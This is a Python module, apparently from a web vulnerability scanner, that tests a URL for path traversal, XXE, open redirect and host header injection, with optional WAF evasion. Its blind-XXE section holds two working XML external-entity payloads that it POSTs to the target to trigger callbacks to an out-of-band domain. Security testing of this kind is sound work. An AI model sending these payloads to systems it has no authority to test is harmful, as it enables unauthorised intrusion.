"""Composite path test — LFI, XXE, Open Redirect, Host Header Injection."""

from __future__ import annotations

import json
import logging
import time
from typing import Any

from numasec.scanners._envelope import wrap_result

logger = logging.getLogger(__name__)


async def path_test(
    url: str,
    checks: str = "lfi,xxe,redirect,host_header",
    params: str = "",
    method: str = "GET",
    headers: str = "",
    waf_evasion: bool = False,
    oob: bool = False,
) -> dict[str, Any]:
    """Test for path traversal, XXE, open redirect, and host header injection.

    Args:
        url: Target URL to test.
        checks: Comma-separated: lfi, xxe, redirect, host_header.
        params: Comma-separated parameter names. Auto-detect if omitted.
        method: HTTP method (GET or POST).
        headers: Optional JSON string of HTTP headers for authenticated testing.
        waf_evasion: Enable WAF bypass encoding for payloads.
        oob: Enable Out-of-Band detection for blind XXE via interactsh.
    """
    start = time.monotonic()
    check_set = {c.strip().lower() for c in checks.split(",")}
    extra_headers: dict[str, str] = headers if isinstance(headers, dict) else (json.loads(headers) if headers else {})
    param_list: list[str] | None = [p.strip() for p in params.split(",") if p.strip()] or None
    results: dict[str, Any] = {
        "url": url,
        "checks_run": sorted(check_set),
        "vulnerabilities": [],
    }

    if "lfi" in check_set:
        try:
            from numasec.scanners.lfi_tester import LfiTester

            tester = LfiTester(extra_headers=extra_headers, waf_evasion=waf_evasion)
            lfi_result = await tester.test(url, params=param_list, method=method)
            result_dict = lfi_result.to_dict()
            results["lfi"] = result_dict
            results["vulnerabilities"].extend(result_dict.get("vulnerabilities", []))
        except Exception as exc:
            results["lfi"] = {"error": str(exc)}

    if "xxe" in check_set:
        try:
            from numasec.scanners.xxe_tester import XxeTester

            xxe_tester = XxeTester()
            xxe_result = await xxe_tester.test(url, headers=extra_headers or None)
            result_dict = xxe_result.to_dict()
            results["xxe"] = result_dict
            results["vulnerabilities"].extend(result_dict.get("vulnerabilities", []))
        except Exception as exc:
            results["xxe"] = {"error": str(exc)}

    if "redirect" in check_set:
        try:
            from numasec.scanners.open_redirect_tester import OpenRedirectTester

            redirect_tester = OpenRedirectTester()
            redirect_result = await redirect_tester.test(url, headers=extra_headers or None)
            result_dict = redirect_result.to_dict()
            results["redirect"] = result_dict
            results["vulnerabilities"].extend(result_dict.get("vulnerabilities", []))
        except Exception as exc:
            results["redirect"] = {"error": str(exc)}

    if "host_header" in check_set:
        try:
            from numasec.scanners.host_header_tester import HostHeaderTester

            hh_tester = HostHeaderTester()
            hh_result = await hh_tester.test(url)
            result_dict = hh_result.to_dict()
            results["host_header"] = result_dict
            results["vulnerabilities"].extend(result_dict.get("vulnerabilities", []))
        except Exception as exc:
            results["host_header"] = {"error": str(exc)}

    # OOB blind XXE: inject XXE payloads with OOB callback domain
    if oob and "xxe" in check_set:
        try:
            import asyncio

            from numasec.tools.oob_tool import python_oob_poll, python_oob_setup

            setup_raw = await python_oob_setup()
            setup_data = json.loads(setup_raw) if isinstance(setup_raw, str) else setup_raw
            if setup_data.get("status") == "registered":
                oob_domain = setup_data["domain"]
                oob_cid = setup_data["correlation_id"]

                # Inject blind XXE payloads
                import contextlib

                import httpx

                from numasec.core.http import create_client

                xxe_payloads = [
                    f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "http://xxe.{oob_domain}/">]><r>&xxe;</r>',
                    f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % d SYSTEM "http://xxe.{oob_domain}/xxe">%d;]><r/>',
                ]
                async with create_client(timeout=10, headers=extra_headers or None) as client:
                    for payload in xxe_payloads:
                        with contextlib.suppress(httpx.HTTPError):
                            await client.post(
                                url,
                                content=payload,
                                headers={"Content-Type": "application/xml"},
                            )

                await asyncio.sleep(3)
                poll_raw = await python_oob_poll(correlation_id=oob_cid)
                poll_data = json.loads(poll_raw) if isinstance(poll_raw, str) else poll_raw

                interactions = poll_data.get("interactions", [])
                if interactions:
                    results["oob_xxe"] = {"blind_xxe_confirmed": True, "interactions": interactions}
                    results["vulnerabilities"].append(
                        {
                            "type": "blind_xxe",
                            "severity": "high",
                            "confidence": 0.95,
                            "evidence": (
                                f"Blind XXE confirmed via OOB callback: "
                                f"{interactions[0].get('protocol', 'unknown')} from "
                                f"{interactions[0].get('remote_address', 'unknown')}"
                            ),
                            "parameter": "",
                            "payload": f"XXE with OOB domain: {oob_domain}",
                        }
                    )
        except Exception as exc:
            results["oob_xxe"] = {"error": str(exc)}

    total = len(results["vulnerabilities"])
    results["summary"] = f"{total} path/redirect {'vulnerability' if total == 1 else 'vulnerabilities'} found"
    return wrap_result("path_test", url, results, start_time=start)
